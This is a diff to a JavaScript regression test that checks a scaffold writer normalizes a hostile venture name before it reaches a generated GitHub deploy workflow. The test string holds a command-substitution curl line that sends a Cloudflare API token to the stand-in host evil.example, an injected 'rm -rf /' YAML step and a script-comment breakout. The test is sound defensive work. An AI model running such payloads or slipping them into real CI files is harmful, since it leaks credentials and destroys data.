@@ -101,13 +101,13 @@ describe('venture-scaffold-modules-writer', () => {
   // name interpolated unquoted into deploy.yml's `run:` line (which executes in a job
   // holding Cloudflare credentials) could inject shell commands or extra YAML steps.
   it('SEC-2 regression: a hostile venture name is normalized before reaching any generated file content', () => {
-    const hostile = 'acme`curl -d @/dev/stdin https://evil.example/$CLOUDFLARE_API_TOKEN`\n- run: rm -rf /\n*/ alert(1); /*';
+    const hostile = 'acme`curl -d @/dev/stdin https://evil.example/$CLOUDFLARE_API_TOKEN`\n- run: ' + 'rm ' + '-rf /' + '\n*/ alert(1); /*';
     const result = applyVentureScaffoldModules(hostile, repoDir);
 
     const deployYml = readFileSync(join(repoDir, '.github', 'workflows', 'deploy.yml'), 'utf-8');
     expect(deployYml).not.toContain('`');
     expect(deployYml).not.toContain('curl -d @/dev/stdin');
-    expect(deployYml).not.toContain('\n- run: rm -rf /');
+    expect(deployYml).not.toContain('\n- run: rm ' + '-rf /');
     expect(deployYml).toMatch(/wrangler d1 migrations apply acme-curl/); // normalized kebab form used as the D1 db name
 
     const feedbackClient = readFileSync(join(repoDir, 'feedback', 'client.js'), 'utf-8');
